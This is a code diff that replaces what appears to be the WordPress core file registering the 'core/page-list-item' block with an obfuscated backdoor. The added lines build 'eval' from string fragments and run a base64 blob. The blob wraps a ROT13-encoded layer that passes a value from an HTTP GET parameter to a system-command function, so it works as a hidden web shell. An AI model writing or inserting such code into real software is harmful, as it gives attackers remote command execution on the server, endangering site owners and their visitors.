@@ -1,26 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Server-side rendering of the `core/page-list-item` block.
- *
- * @package WordPress
- */
-
-/**
- * Registers the `core/page-list-item` block on server.
- *
- * @since 6.3.0
- */
-function register_block_core_page_list_item() {
-	register_block_type_from_metadata( __DIR__ . '/page-list-item' );
-}
-add_action( 'init', 'register_block_core_page_list_item' );
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogRnJlaXJlLWZ2cXIgZXJhcXJldmF0IGJzIGd1ciBgcGJlci9jbnRyLXl2ZmctdmdyemAgb3licHguCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKi8KCi8qKgogKiBFcnR2ZmdyZWYgZ3VyIGBwYmVyL2NudHIteXZmZy12Z3J6YCBveWJweCBiYSBmcmVpcmUuCiAqCiAqIEBmdmFwciA2LjMuMAogKi8Kc2hhcGd2YmEgZXJ0dmZncmVfb3licHhfcGJlcl9jbnRyX3l2ZmdfdmdyeigpIHsKCWVydHZmZ3JlX295YnB4X2dsY3Jfc2Viel96cmducW5nbiggX19RVkVfXyAuICcvY250ci15dmZnLXZncnonICk7Cn0KbnFxX25wZ3ZiYSggJ3ZhdmcnLCAnZXJ0dmZncmVfb3licHhfcGJlcl9jbnRyX3l2ZmdfdmdyeicgKTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
